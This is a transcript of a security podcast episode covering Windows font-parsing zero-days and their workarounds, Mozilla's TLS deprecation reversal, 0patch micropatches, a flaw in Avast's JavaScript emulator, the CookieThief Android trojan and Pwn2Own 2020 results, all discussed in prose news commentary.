STEVE:  So thanks for thinking of us, Tony.  And I did not have this in the show notes.  I stumbled upon my note about it after this had all been put to bed.  But I wanted to let our listeners know, for those who have certainly kids and maybe young adults at home, Amazon has created something known as "Audible Stories."  They said:  "For as long as schools are closed, we're open.  Starting today, kids everywhere can instantly stream an incredible collection of stories, including titles across six different languages, that will help them continue dreaming, learning, and just being kids.  All stories are free to stream on your desktop, laptop, phone, or tablet."  They said:  "Explore the collection, select a title, start listening."



So basically they're helping the parents of stay-at-home kids by saying we're going to make our audio book collection available for kids at home.  So give them something to do, which I think sounds like a great thing.  So just wanted to mention that.



Okay.  So you correctly guessed what the first issue of the day was, which are two new unpatched zero-days affecting billions of Windows users.  Their advisory, Microsoft's advisory was published just yesterday on the 23rd of March, titled "Type 1 Font Parsing Remote Code Execution Vulnerability."  They said:  "Microsoft is aware of limited targeted attacks that could leverage unpatched vulnerabilities in the Adobe Type Manager Library, and is providing the following guidance to help reduce customer risk until the security update is released."



They said:  "Two remote code execution vulnerabilities exist in Microsoft Windows when the Windows Adobe Type Manager Library improperly handles a specially crafted multi master font, Adobe Type 1 PostScript format."  They said:  "There are multiple ways an attacker could exploit the vulnerability, such as convincing a user to open a specially crafted document or viewing it in the Windows Preview pane."



They said:  "Microsoft is aware of this vulnerability and is working on a fix."  Also they're aware of attacks in the wild, thus it's a zero-day.  They said:  "Updates that address security vulnerabilities in Microsoft software are typically released on Update Tuesday, the second Tuesday of each month.  This predictable schedule allows for partner quality assurance and IT planning, which helps maintain the Windows..." blah blah blah blah.



So basically they're saying we're sticking to Patch Tuesday for this.  Coincidentally, and unfortunately, this is one of those months which has the latest possible Patch Tuesday, where the 31st of March is next Tuesday, so the first is the following Wednesday, and the second Tuesday is as far back as it could be.  So three weeks from today, essentially.



Both of the unpatched flaws are known to be used in limited targeted attacks, and they impact all supported versions of the Windows operating system, I guess because the Adobe Font Type Manager Library has been there through all of them.  Windows 10, 8.1, Server 2008, 12, 16, and 19, and Windows 7, which of course we know for which Microsoft ended their support, as they did for Server 2008, in January.



The vulnerabilities reside in this Adobe Font Type Manager Library, which is a font-parsing and display subsystem used by Windows Explorer to display the content of a file in the Preview or the Details panes, without users needing to open it.  So this is potentially a "you don't have to do anything" exploit.  It's also used by many pieces of third-party software.  It's part of Windows.  So third-party software can just presume that this library will answer the call.  The problem is that the Type Manager Library is improperly handling a specially crafted multi master font in the Type 1 Postscript format, and it allows remote attackers to execute arbitrary malicious code on target systems.



LEO:  Who was it said "Interpreters are hard"?  Oh, yeah, Steve Gibson.



STEVE:  Ah.  Yes.  So the obvious attack route involves convincing a user to open a specially crafted document or viewing it in the Windows Preview pane.  It's not clear whether the flaws can also be triggered remotely over a web browser by convincing a user to visit a web page containing specially crafted malicious OTF fonts.  And there are multiple ways an attacker might be able to exploit the vulnerability.  And interestingly enough, Microsoft mentions the WebDAV, the Web Distributed Authoring and Versioning client service, as another vector into the system.  So it's clear we're not going to get anything...  



LEO:  Microsoft's implementation of WebDAV, or WebDAV in general?  Because WebDAV is widely used.



STEVE:  Right.  And so it's just that WebDAV is a way in to get to this faulty library.



LEO:  Right.  Well, there's lots of ways to get to the library.  That's easy.



STEVE:  Yeah.  So they are offering some workarounds.  I like the final one, which is final in several senses.



LEO:  Install Linux; right?



STEVE:  That's the Leo solution.



LEO:  I swear to god, I don't run Windows on any machines anymore.  It's just ridiculous.



STEVE:  No, no.



LEO:  It's ridiculous.  This is all versions of Windows, too; right?



STEVE:  Yup, all versions.  



LEO:  Even Windows 7.  All versions.  Windows 10.



STEVE:  Yes.  And Microsoft knows of it.  It's being used in targeted attacks.



LEO:  Zero-day, it's a zero-day.



STEVE:  It's a zero-day.  And we also know that zero-days are kept quiet and sneaky until they are discovered, at which point they then change their tactic.  They want to get everybody they can before the patch shuts them down.  So yes, Microsoft, when you posted this news, it was used in selective, targeted, stealthy attacks.  Now it's probably being sprayed because they want to do as much, they want to get as much action out of this before it is shut down.



LEO:  It's now or never, yeah.



STEVE:  And again, Microsoft is using apparently the fact that it is in targeted attacks to say, well, you know, three weeks, that's not going to be so bad.  Good luck.  So it is possible to set - there is an option under the View settings of Windows Explorer, you know, the thing that we use for viewing our files in Windows.  Not Internet Explorer, Windows Explorer, or just Explorer.  You can turn on a checkbox, "Always show icons, never thumbnails."  So if you enable that, what that does is that prevents Explorer from going out to Adobe and asking for its help in rendering a thumbnail to show you in the Preview pane or in the Summary pane.  So you can turn that on if you want to thwart this one avenue in.



However, they also recommend disabling the WebClient service under Windows, and you could do that by going to the Windows Services, scrolling all the way down to W's, where you'll find Windows WebClient.  And mine was set to "manual" and "auto trigger."  They want you to set it to "disabled" so nothing will start it.  And so that helps you solve like a different entry into the system.  



LEO:  Nobody's going to - nobody except you and people who know what they're doing is going to know about this or do it.



STEVE:  Yeah, yeah.  Well, and that's the problem is that, you know, our listeners, who listen because they like these little kinds of...



LEO:  Yeah, this is why you listen, yeah.



STEVE:  Exactly.  They'll be safe.  But the rest of the world is now subject to three weeks of probably an escalating attack using this.



LEO:  You couldn't pick a worse three weeks, of course, because everybody's working from home.  They took those Windows machines home.  If I were a bad guy, you know what I'd do, I'd take advantage of that time, get on as many systems as possible, so that when they're brought back to work, you could really get -you could have some fun.



STEVE:  Well, also we are seeing a sadly predictable huge upswing in coronavirus-leveraged attacks.  You know, so...



LEO:  Oh, yeah.  People are awful.  People are awful.



STEVE:  I know.  It's just unbelievable.  We talked last week about some actual DDoS attacks on medical infrastructure.  I did see one little note saying that some of the ransomware people were going to lay off the health services industry during this time.



LEO:  Oh.  Yeah.  I hope that's universal.  No.  Geez.



STEVE:  Anyway, so the problem would be that, if this can be leveraged in a social engineering attack, this is a time when lots of people are very worried about this problem and are thus more subject to not thinking before they click.  And so as we've often said, we haven't used this little pithy bit of advice for quite a while, it's never download anything that is offered to you.



LEO:  Period, yeah.  



STEVE:  That's a golden oldie.  Period.  If something says, oh, you need to update your Flash Player, no.  Never download something that is offered.  Only go and get it yourself, if you have reason to believe you need it, because first of all, everything seems to be working just fine without this thing that you're now told you need.  So just blow it off.  Just no.



Okay.  But just to finish, in the show notes I've got Microsoft's good advice, which they save to last because it's the most onerous.  And that is to rename this DLL.  It's atmfd.dll.  And there are two scripts, one for 32-bit systems and a double-length one for 64-bit systems.  It switches you -  you use it from the command prompt.  I'm sure you have to be an elevated command prompt, an admin command prompt.  Switches you to the Windows directory system32.  Then runs the "takeown" command to take ownership of that DLL.  Then runs the access control list utility, icacls.exe, saving the existing access control list for atmfd.dll into a temporary file.  Then grants admin's access to the DLL.  Then renames, which you are now an admin, renames atmfd.dll to x-atmfd.dll.



Basically, that just means that no one in the system that expects to be able to simply load this Adobe Type Manager DLL will then succeed.  So that forecloses all access to it.  Again, limited targeted attacks.  It's unlikely that any individual that we're talking to will get hit by this.  But in the interest of caution, presumably in three weeks the update will replace this DLL with the right one.  So the old one, the x-atmfd.dll - oh, and on 64-bit systems you have to do it twice because the 64-bit systems have the old 32-bit and the new 64-bit versions.  So it does it twice.  But it's quick to do.  And if I were concerned, that's what I would do.  It just removes this Adobe Type Manager DLL from your system by renaming it to something that will never be seen.  And then in three weeks the update will replace that empty slot with a fixed atmfd.dll.



LEO:  Now, do we blame Adobe or Microsoft for this?



STEVE:  I don't know.  And maybe that explains the delay.  Maybe if this were Microsoft's own code, they'd be able to say, ooh, crap, and jump on it immediately and fix it.  It may be that, because this thing is actually an Adobe problem, they've had to work through just the intercorporate stuff; and Adobe said, well, we'll work on it and get it to you in a couple weeks.



LEO:  So these Type 1 fonts are an Adobe font style and usually on Windows.



STEVE:  They're the early, early fonts.



LEO:  They're early, right.  Then TrueType took over.  And so you see those OTF fonts are the older ones, and TTF are the newer ones.  And the Type Manager was necessary, I guess, for rendering the fonts.  But it might be a Microsoft product that's labeled Adobe Type Manager because it's for managing the Adobe Type 1 fonts.  So it's unclear; right?  I mean...



STEVE:  Yeah.  And I was about to go click on it and check the properties because...



LEO:  Maybe not.



STEVE:  We could see where it came from.  Except that, even if it came from Adobe, Microsoft might take ownership of it and wrap it in their own shell. 



LEO:  So you're looking for atmfd.dll; right?  If you delete that, you're good; right?



STEVE:  Yeah.



LEO:  Okay.  And there's two of them?  Is there one in 32 that says atmfd32.dll?



STEVE:  Yeah, well, actually they're in different directories.  So they're all atmfd.dll.



LEO:  I just [crosstalk] how Windows is made.  Oh, my god.



STEVE:  It's, well, they've had this really awkward problem.



LEO:  Just leave the 32-bit over there, yeah.



STEVE:  Yeah, and now we've got the Program Files x86, which was like - and then they decided, oh, we made a mistake with that, so we're going to abandon that approach.



LEO:  It's just so ugly.



STEVE:  It's really become - yeah.  It's really become a problem through the years, yeah.  There is a registry tweak also in the show notes that applies to Windows 8.1 and earlier.  So if you are a Windows 7 user, you could apply, just apply this registry tweak that should take it offline and out of service, and then that should be good also.  It's a mess.



LEO:  Yeah.  It's in the show notes, but it's not as a download, it's an actual edit you have to do.  Is that - oh, my god.  See, no one's going to do this.



STEVE:  Yeah.  Look at it.  It's just a mess.



LEO:  [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows] "DisableATMFD"=dword: - can you just write "1," or do you have to write "00000001"?



STEVE:  I think you can write "1."



LEO:  It's just "true."



STEVE:  Yeah.



LEO:  Geez, Louise.  Okay.



STEVE:  Okay.  So our listeners all know that exists for three weeks, then they're going to fix it.  So you could rename the DLL, if you like.  You could turn off some display things in Windows.  Or not worry about it, who knows.



LEO:  Who knows.



STEVE:  Microsoft - not Microsoft.  I see a big "M," and I think Micro.  Mozilla reversed itself on TLS v1.0 and 1.1 deprecation.  Get this, Leo, due the coronavirus.  As we know, we talked about it a couple weeks ago, TLS 1.0 and 1.1 was going to be dropped on March 10th, two weeks ago, with the release of Firefox 74 - which is the current release, it's what I'm using now - to improve the security, as we know, of website connections so that sites not supporting the better protocols 1.2 or 1.3 would then start showing a blank page.  I mean, the big scary warning "Secure Connection Failed" error page.  I mean, it was going to be - we're not just saying "not secure" anymore, we're saying no.  And remember the plan was nobody's going to make this change until they're forced to.  The U.K. firm, can't remember their name, Netcraft, their survey showed that this month there were still 850,000 websites not yet offering 1.2 and 1.3, still only offering 1.0 and 1.1.



But then coronavirus happened.  And I've got a link to their release notes, and their release notes show, they say:  "We have disabled TLS 1.0 and TLS 1.1 to improve your website connections.  Sites that don't support TLS version 1.2" - and they meant 1.3 - "will now show an error page."  That is crossed out in the release notes for Edition 74 of Firefox.



LEO:  Oh, and I love the reason why.



STEVE:  Yes.  "We reverted the change for an undetermined amount of time to better enable access to critical government sites sharing COVID-19 information."



LEO:  Oh, my god.



STEVE:  Uh-huh.  So essentially, coronavirus just tipped the balance enough that apparently some government sites were among those 850,000 that have not yet gotten their act together and moved to 1.2 or 1.3.  And Mozilla was realizing that their users, their Firefox users, were getting connection failure when trying to go to those sites.  So they said "whoopsie" and backed out and are leaving 1.0 and 1.1 on.



To check that, and any of our listeners can, SSL Labs not only has the famous server-side check, but they've got a browser client-side check.  So you can go to SSLLabs.com and select, I think it's the second one down on the right, the client test, which will quickly check your client for which protocols it supports.  And I went there with my Firefox 74, and it showed it supported 1.3 and 1.2, and it was all happy about those.  And, oh, it supported 1.1 and 1.0, which was red, it did not like the fact that my browser still supported those, but it showed yes, they are supported.  So at some point, presumably, you know, who knows when.



And I was wondering whether, and I didn't have a chance to check this, whether Chrome also reversed themselves because this was all being done - remember Chrome and Mozilla and, well, basically Chromium, Mozilla, and Safari were all in lockstep with this.  I hope everybody backed off, if there actually were sites, as presumably Mozilla discovered, that were not coming up if 1.0 and 1.1 were blocked.  Anyway, so it's been reversed.  And the pressure campaign will resume once it's no longer a health-critical issue for Mozilla's Firefox users.



LEO:  That's interesting.  Boy.  I wonder what government sites are still using TLS 1.0 and 1.3?  It must be 1.3; right?



STEVE:  Well, 1.1, hopefully 1.1.  So, you know, it's not that those are obviously bad.  I mean, it's not like they're broken, and you can actually decrypt traffic.



LEO:  They're just not secure enough.



STEVE:  Yeah.  They're not what we would want to be using moving forward.  And presumably the sites are informational.  They're not requiring high security credentials and so forth.  So it's like, yeah, let people get there rather than not.  Probably makes more sense.



LEO:  Yeah.  Worse to break the site in this case.



STEVE:  Yeah.  Okay.  So I think moving forward, and it'll be interesting to watch the slowly dwindling inventory of Windows 7 and Server 2008 machines on the Internet.  But this notion of micropatching, you and I have talked about it a couple times.  You've been a little hesitant.



LEO:  Yeah, it makes me nervous, yeah.



STEVE:  Worrying about these guys.



LEO:  Yeah.  Who are these guys?



STEVE:  But if you look at them, they really do look like the real deal.  So, okay.  So where are we?  On Patch Tuesday of this month we learned of the CVE ending in 0881.  It's a remote code execution vulnerability affecting all versions of Windows.  But of course Windows 7 and Server 2008 didn't get it.



Microsoft said:  "A remote code execution vulnerability exists in the way that the Windows Graphics Device Interface (GDI) handles objects in memory.  An attacker who successfully exploited this vulnerability could take control of the affected system.  An attacker could then" - so, I mean, this is critical.  This is a critical vulnerability in GDI.  "An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.  Users whose accounts are configured to have fewer user rights on the system could be less impacted than users who operate with admin rights."



Unfortunately we know that privilege escalation exploits are widely available also.  So this should be, you know, should provide not much sense of refuse, or what I'm trying to say...



LEO:  Refuge.



STEVE:  Refuge, thank you.



LEO:  Or refuse.



STEVE:  "There are multiple ways an attacker could exploit the vulnerability.  In a web-based attack scenario, an attacker could host a specially crafted website that is designed to exploit the vulnerability, then convince users to view the website."  So in other words, just bringing up a web page.  "An attacker would have no way to force the users to view the attacker-controlled content."  Except, right, opening the web page.  So an attacker could convince users to take some action, typically by getting them to open an email attachment or click a link in an email or an instant message.  "In a file-sharing attack scenario, an attacker could provide a specially crafted document file that's designed to exploit the vulnerability, and then convince users to open the document."



Okay.  So right now this remote code, this critical remote code execution vulnerability has been present for two weeks, since March 10th, and it's never going to be fixed unless we micropatch.  So we have, absent a micropatch, a potentially exploitable flaw in Windows 7, Server 2008, which Microsoft will never patch.  If nothing is done, it will persist forever.  It will get added to the cyberattack inventory of state actors and freelance hackers for use whenever they wish to leverage old and known, but never patched, Windows 7 and Server 2008 vulnerabilities.  The point is we're now entering this era where there is going to be a growing inventory of ways to attack Windows 7 and Server 2008 that are never going to get fixed unless we go outside of Microsoft.



So the 0patch guys, again, it's numeral 0-P-A-T-C-H dot com, 0patch, and they call that "Micropatch," have generated another of their micropatches to fix the problem for those who cannot obtain the official fix from Microsoft.  And of course anyone on the ESU, the Extended Services - ESU or ESR?  I thought it was ESU.  I don't know what that stands for.  Maybe it's Service Releases, ESR.  Anyone on that plan will still be getting them, which is what's galling for all other Windows users who don't have them.  So it's available to 0patch's paying customers.  The subscription is $26 per year per workstation.  So, what, a little over $2 per month per workstation.



And in this case it repairs the memory corruption issue in Windows GDI+ by adding a block of code similar to the one Microsoft used in their official security fix.  In other words, the 0patch guys are still getting the patches.  They look at what Microsoft did, and they go, oh, yeah, okay.  And they do the same thing and make it available to their customers.



LEO:  Microsoft must not like that very much.  Although...



STEVE:  Yeah.  Suck on that, Microsoft.



LEO:  Yeah, exactly, yeah.



STEVE:  On systems where the micropatch is present, it implements a logically identical check.  Now, get this.  If you were a subscriber a year ago, for example, at a little over two bucks per month per workstation, you're already fixed.  That is, they have, 0patch has a little client module which is automatically updating your system as these micropatches become available, without you having to do anything.



LEO:  What could possible go wrong with that?



STEVE:  You don't even need to reboot your system.



LEO:  Oh, my god.



STEVE:  So it's way better than Microsoft Windows in that sense.  So get this.  On systems where it's present, it implements a logically identical check to Microsoft's, but also records an exploitation attempt event before redirecting execution flow through the safe path.  The patch for 32-bit systems is four instructions.  The patch for 64-bit systems is five instructions.



And Leo, there's a YouTube video here you just might want to place into the stream.  It's only a few seconds long, but it shows them doing the exploit, dropping an image on PowerPoint, and PowerPoint crashing when the micropatch is turned off.  And then they flip the micropatch protection on, and they do the same thing, and it pops up a box saying that an exploit attempt was just caught.  So it also gives you proactive information, if someone tries to hack your system.



So anyway, the next link is 0patch.com/pricing.html.  And it's not very expensive.  They have a free version.  They give some of the things away for free.  They're hoping to upsell people, obviously, to a subscription.  And they're not asking for a lot.  So again, Windows 7 people can decide if you want to sort of follow along with the podcast.  For example, renaming the Adobe Type Manager DLL, just getting rid of it, essentially, for all time solves that problem under Windows 7.  Doesn't look like there's a similar fix other than something like this micropatch.  So that's what you would need to do if you wanted ongoing protection.  So anyway, worth considering.



LEO:  Are you doing this?  Would you do this?



STEVE:  I'm not doing it; but I'm, well, yeah, I am still on Windows 7.  I do have - we do know that they're continuing the operation of Windows Defender, so that's continuing to protect us on an ongoing basis.  I'm glad for that.  Lawrence Abrams is 100% bullish about these guys.  He knows them.  He's talking to them all the time.  He's covering them in detail.  And I think they're...



LEO:  That's a good recommendation.



STEVE:  I think they're a legitimate, yeah, I think they're a legitimate outfit.  In fact, I've been considering asking the 0patch guy to come on the show and talk to us.



LEO:  You should, yeah.



STEVE:  And give us a sense for what they're doing.



LEO:  Look into his eyes and see if he's trustworthy.



STEVE:  Exactly.  And fortunately we can do that now virtually.  Okay.  So Chrome also.  And since I put this together I discovered that Edge is following, because of course Edge is now Chromium based.  Last Wednesday the 18th, Google announced that major Chrome browser and OS releases will be placed on hold due to the adjusted work schedules of employees having to work from home during the coronavirus sequestration.  Their announcement stated that they would be placing priority on security, that is, browser security, which makes sense.  As we know, most new browser versions bring us a mixture of new features, or often these days the removal of some creaky old features like TLS 1.0 and 1.1.  And of course they also bring a bunch of security-related bug fixes.



So during this work-at-home time, the Google Chrome development team will be working remotely and prioritizing security updates that will be released as Chrome version 80 updates.  So 80 is where we are now.  And so Google will be doing incremental updates to 80, rather than jumping to 81 as had been planned.  Google's Chrome 80.0.3987.149 was released right after the company announced that Chrome 81 was delayed, with security fixes which patched 13 high security vulnerabilities.



So we just got an update to 80, fixing 13 high security vulnerabilities, and don't hold your breath for 81.  81 is on the backburner.  It was originally slated to start rolling out last Tuesday, on the 17th, but in the Google Developers blog they said we've decided that we're going to hold off on doing that.  There was a bunch of stuff slated for release in that:  modernized appearance, hit testing for augmented reality, app icon badge support, and initial support for Web NFC.  We'll be waiting for that.  We're just going to kind of hold on and just keep the existing Chrome secure.



Oh, and also affected were Android developers, sort of indirectly.  They were informed, well, Android because of Google, they were informed that they could now expect to experience significantly longer than normal app review times due to the adjusted work schedules, as up to seven days or longer.  A Google spokesman said:  "Due to adjusted work schedules at this time, we are currently experiencing longer than usual review times.  While the situation is currently evolving, app review times may fluctuate, and may take seven days or longer."



So anyway, the coronavirus, as we know, it's impacted Northern California, the so-called Silicon Valley, significantly, even though Google is spread out all over the place.  Northern California was one of the first to implement the stay-at-home orders from California's governor.  And actually I just heard this morning, I haven't seen any confirmation, Lorrie just told me that they're seeing some downturn finally.  I mean, like the first indication of a downturn in the numbers in Northern California.  So that would be amazing, if that turned out to be the case.



As we know, Avast has been having problems recently.  They were behind one of the collisions with the Windows Update that we talked about a few months ago.  And everyone knows, Leo, that you and I are both rather down on the idea of third-party AV.  It's increasingly, dare I say, the cure is worse than the problem it's solving.



LEO:  Be careful.



STEVE:  Yeah.  We haven't heard much recently from Google's Tavis Ormandy.  But earlier this month he used a nifty tool he developed three years ago, back in 2017.  We've talked about it before.  It allows Tavis to essentially excise Windows DLLs and run them under Linux, where automated fuzzing and other security  tests can be performed sort of in vitro, as opposed to in vivo.  It's a very cool concept.  In this instance, this allowed Tavis to discover a trivially executed critical flaw in Avast's AV system.  Tavis informed Avast; whereupon, after a week of scrambling around, they finally disabled this critical component of their AV product altogether.



What he found, what Tavis found, was a security flaw, a bad one, in Avast's JavaScript emulator engine, which is like an interpreter on steroids, and I can't even imagine embracing the idea of emulating the execution of JavaScript with the goal of analyzing its execution to discover anything malicious, anything that it decides is bad.  Wow.  That's like a heuristic on steroids.  Anyway, it analyzes incoming JavaScript code for malicious action before allowing it to execute in browsers or email clients. 



Tavis wrote:  "Despite being highly privileged and processing untrusted input by design, it is unsandboxed and has poor mitigation coverage.  Any vulnerabilities in this process are critical, and easily accessible to remote attackers."  He explained that exploitation of the bug was trivial once it was known.  All it takes is sending a malicious JavaScript or Windows scripting host file to a user via email, or tricking a user to access a booby-trapped file containing malicious JavaScript code.  The faulty Avast engine would then stumble over the file, and the attacker would obtain system-level access with no restrictions.  They could then have the ability to install malware on an Avast user's device because of Avast AV being present.



So as I mentioned, a week passed after Tavis notified Avast, and who knows what kind of urgency he put on them.  We know that Tavis can be ruthless when it comes to imposing a deadline after which he's going to release the news.  And he tends to do that with more urgency, the more urgent the problems are that he finds.  He probably gave them only a week to do something.  The problem would have been also that just fixing the one problem wouldn't have satisfied him.  He talks about it not being sandboxed.  Well, sandboxing this was probably a big project.



So anyway, they scampered around for a week.  Nothing happened.  They were probably hoping to get some sort of a quick fix.  Maybe they did, and Tavis said no.  We don't know what happened behind the scenes.  But the problem is probably more systemic.  So whatever the case, after a week they decided to completely disable the JavaScript scanner functionality until it could be properly fixed.  So now a significant useful but dangerous - and, you know, Avast users should be, I guess, glad they don't have it because especially now that it's been discovered as being flawed and inadequate, it would put them at much more risk.



So they issued a statement saying:  "Last Wednesday, March 4th, Google vulnerability researcher Tavis Ormandy reported a vulnerability to us affecting one of our emulators.  The vulnerability could have potentially been abused to carry out remote code execution."  Uh-huh.



"On March 9th, he released a tool" - as he did on GitHub - "to greatly simplify vulnerability analysis in the emulator.  We have fixed this" - and they didn't put it in quotes.  I would have - "have fixed this by disabling the emulator, to ensure that our hundreds of millions of users are protected from any attacks.  This won't affect the functionality" - what?  "This won't affect the functionality of our AV product, which is based on multiple security layers."  On the other hand, it will no longer find malicious JavaScript incoming.



So there's no current timeline for when their patch will be ready.  And again, this further reinforces what we have been saying, Leo, recently, that the third-party AV is really becoming a problem.  It seems to be also the problem that Microsoft Update is stumbling over time and again.



LEO:  Yeah, that's right.



STEVE:  Remember those cute days of Firesheep?



LEO:  The good old days.



STEVE:  The good old days where it was easy to take over an account.  You simply looked for cookies flying by on an unencrypted connection or on an open WiFi and grabbed the cookie and started sending it yourself.  Suddenly you were logged in as the person whose cookie you captured because - and I'll cover this a little bit more briefly in a second - cookies are by their nature static.  They're just little blobs which the browser regurgitates to the server, which is an inherent vulnerability that has not yet been solved.



So it turns out that Kaspersky's security announcement was titled "CookieThief:  A Cookie-Stealing Trojan for Android."  They discovered a bunch of trojans under the banner Trojan-Spy.AndroidOS.Cookiethief.  They said:  "A combination of new modifications to Android malware code has given rise to Trojans able to steal browser and app cookies from compromised devices."



So on Thursday, March 12th, 12 days ago, the guys at Kaspersky revealed a new malware family which, thanks to their actions of discovery, they dubbed "CookieThief," and the actions that this malware family takes.  It uses a combination of exploits to acquire root rights on an Android device, which it then uses to steal the user's Facebook cookie data.  And it was interesting that it's Facebook.



Kaspersky wrote:  "We recently discovered a new strain of Android malware.  The Trojan" - and then they give that same name - "turned out to be quite simple.  Its main task was to acquire root rights on the victim device, and transfer cookies used by the browser and the Facebook app to the cybercriminals' server.  This abuse technique is possible, not because of a vulnerability in the Facebook app or the browser themselves.  Malware could steal cookie files of any website from other apps in the same account and achieve similar results."



So as we know, cookie stealing is all about account hijacking.  The only way - and this is the problem, the fundamental problem - in which a user's logged-on session is maintained is with one or more secret cookies which, these days, are marked "secure" so they will only be sent over TLS browser queries.  No more simple-minded Firesheep, which simply snagged cookies over the HTTP channel after the user's connection reverted to HTTP following a brief secure interchange of username and password during logon.



But simple static cookies represent a vulnerability.  Unlike a more dynamic system, like SQRL, which always requires the client to solve a cryptographic problem and to return its solution with every query, thus reproving its identity every time, cookies are just static blobs of data.  Although they might be changed periodically, they're simply regurgitated by the browser, which always returns the most recently set cookies for the domain.  And of course the emergence of OAuth, which uses the logged-on status at one site to authenticate the user's identity at other sites, means that someone obtaining a user's Facebook cookies also obtains the ability to impersonate them elsewhere, since they appear to be validly logged onto Facebook.  This would allow them to log on as that user at other sites which offer a "Login With Facebook" option, thus spreading the impersonation further.



Kaspersky wrote:  "On the command-and-control server we also found a page advertising services for distributing spam on social networks and messengers," they said, "so it was not difficult to guess the motive behind the cookie theft operation."  In other words, they've got a trojan which is out there in the wild, obtaining root access for the purpose of obtaining Facebook logon credentials, sending them back to the command-and-control server.  So they're building up a library of valid Facebook authentication, and advertising services for distributing spam on social networks.  In other words, they're going to accept spam advertising for sale and then turn around and use this continuous churning base of logon credentials to send the spam through the people's Facebook accounts whom they have commandeered.



It turns out it's a little more complicated to do this and get away with it.  They're unable to send those out directly because the fact that that would come from a different IP might set off Facebook.  So there's another piece of this which is a proxy which is also installed as part of this malware such that the proxy logs on as the user, using the stolen credentials, accepts the advertising from the command-and-control server, and then sends it from the user's own phone under their credentials.  So anyway, this is sort of an interesting anatomy of an example of the way that an Android malware system is able to commercialize people apparently sending spam from their own accounts out onto the Internet.  Amazing what these guys will do.



So Pwn2Own Spring 2020.



LEO:  Oh, I love this.  I love this.  It's hysterical.



STEVE:  Last Friday was the second and final day of, well, the second and final of two days of the 2020 Spring Edition of HackerOne's always interesting Pwn2Own hacking contest.  This year's winner is, perhaps unsurprisingly...



LEO:  Yes.



STEVE:  Our listeners will know them well, Team Fluoroacetate, formed by the security pair Amat Cama and Richard Zhu.  They won the contest after accumulating nine points across the two-day competition and extended their dominance by winning their fourth tournament in a row.  There were, let's see, one, two, three, four, five, six contestants.  They were at the top with nine.  Then the next one was at seven, and then four, four, three, and zero.  So got a nice spread.  And interestingly, I mean, I just have to wonder, you know, these guys just seem to pull this stuff out of their hat.  And it's like, well, okay.



LEO:  You know they save it all year.  I mean, they're just - that's why it was a little concerning because CanSecWest in Vancouver, because of COVID, was called off.  So I love how they did this.  They had the hackers mail in their exploits.



STEVE:  Right.  So of course since no one is currently meeting face to face, and since the Pwn2Own hacking contest has always been held during the CanSecWest cybersecurity conference occurring in the spring in Vancouver, which as you said, eh, this year, this year's Pwn2Own is the first-ever hacking contest hosted virtually.  Although it sacrificed some of the in-person drama, the participants sent their exploits to the Pwn2Own organizers in advance.  The organizers then ran the code during a live stream with all participants present.  So that's still, that's - yeah.  And it still preserved much of the breath holding because it was like, okay, is this going to work?



LEO:  Plus I think that that's a good, I mean, if your exploit can be automated that way, that's a big deal; right?  You don't have to sit there and go, let me try this.  Oh, no, that didn't work.  Let me try this.



STEVE:  Yeah.



LEO:  If you can make the script, and it works, more power to you.  Right?



STEVE:  Yup.  It doesn't require your last-minute sort of finessing to, like, stroke the Enter key just right in order to slip that bug through.



LEO:  I think the scores were a little lower this time because of that, to be honest.  Because I think there is a certain amount of that.



STEVE:  Yeah.  Well, only one failed.  So during the competition's two-day schedule, six teams managed to hack apps and operating systems including Windows, Mac, Ubuntu, Safari, Adobe Reader...



LEO:  All of them.  All of them.



STEVE:  ...and Oracle Virtual Box.



LEO:  Yeah.



STEVE:  All the bugs, as always, exploited during the contest were immediately reported to their respective companies.  So what happened?  The first exploit of the first day was attempted by the Georgia Tech Systems Software and Security Lab team, who targeted Apple Safari.  And get this, Leo.  With a macOS kernel escalation of privilege, so a browser-based kernel escalation attack.  Yikes.  But the exploit succeeded when the Georgia Tech team used a six-bug exploit chain.



LEO:  Wow.  Wow.  Wow.



STEVE:  Which just makes me shake my head.  I just think, oh, my god.  Chaining together a series of six small flaws in order to amplify the effect of each and get yourself in.  They managed to pop up the calculator app on macOS and escalate its access rights to root.  So that demonstrates they could run anything that they wanted to, feed it commands to do things behind your back with full root access.  And they earned a well-deserved $70,000 U.S. and seven Master of Pwn points for that.



The second exploit attempt was launched by Fluorescence, which is just Richard Zhu by himself.



LEO:  Yeah, I thought that was interesting.  So he works both as a team and by himself.



STEVE:  Right.



LEO:  He did pretty well just by himself.



STEVE:  Yes, he did.  He targeted Microsoft Windows with a local privilege escalation and succeeded.  He used a use-after-free vulnerability in the Windows API to escalate his local privilege.  And that is to say, as we know, as I was just saying, that local privilege escalation, the idea of not running as an admin being protection against some zero-day GDI flaw shouldn't give anyone any comfort because local privilege escalations are all over the place.  Anyway, he found another one, earning himself $40,000 and four points toward Master of Pwn. 



The third exploit was brought by Manfred Paul of the RedRocket CTF team, who targeted Ubuntu Desktop with a local privilege escalation.



LEO:  And how did he get in?  Because I want to know about that one.



STEVE:  And it, too, was successful.  He's a newcomer to Pwn2Own who used an improper input validation bug.  So there again, a bit of an interpreter.



LEO:  Sanitize your inputs, folks.



STEVE:  You're looking at input.  You have to be very careful, at your code, what looks at input because it's possible for the input itself to attack you, which you're trying to prevent from a sanitation standpoint.  And there was a problem.  He was able to escalate privileges and earn $30,000 and three Master of Pwn points.  And in all of these cases we're not getting full detail.



LEO:  Yeah, because I'd like to know what app it was or, you know, what was it that let them do that?



STEVE:  Well, we've got to give the companies behind these things time to go, ooh, crap, and then push out a fix before it comes more widespread.



LEO:  Is it a widespread kernel flaw, or something unique that Ubuntu was doing, or what?



STEVE:  Yeah.  And we're just happy these guys are wearing white hats.



LEO:  Well, that's one point to make is that they have to turn these exploits over to the company afterwards.



STEVE:  Right, right.  Yeah, well, this is a HackerOne-run operation.  So everything is about the good side, where Zerodium is the bad side of this whole deal.



So for the fourth exploit, the Fluoroacetate team was back, setting their sights on Microsoft Windows with a local privilege escalation.  As I said, they're everywhere.  They succeeded in leveraging a use-after-free bug in Windows.



LEO:  Keep hearing that, don't you.



STEVE:  Yeah.  To escalate themselves to full system privilege and earn $40,000 and four more Master of Pwn points.  The second day began when Star Labs targeted Oracle's Virtual Box for the first exploit in the virtualization category, and it succeeded.  The researcher used an out-of-bounds read bug for an information leak and an uninitialized variable for code execution on the Virtual Box hypervisor.



LEO:  That's a little more sophisticated.



STEVE:  So that is a VM escape.  Yeah, you don't want code running on the hypervisor.  He did it.  And he took home $40,000 for his effort, and got four Master of Pwn points.



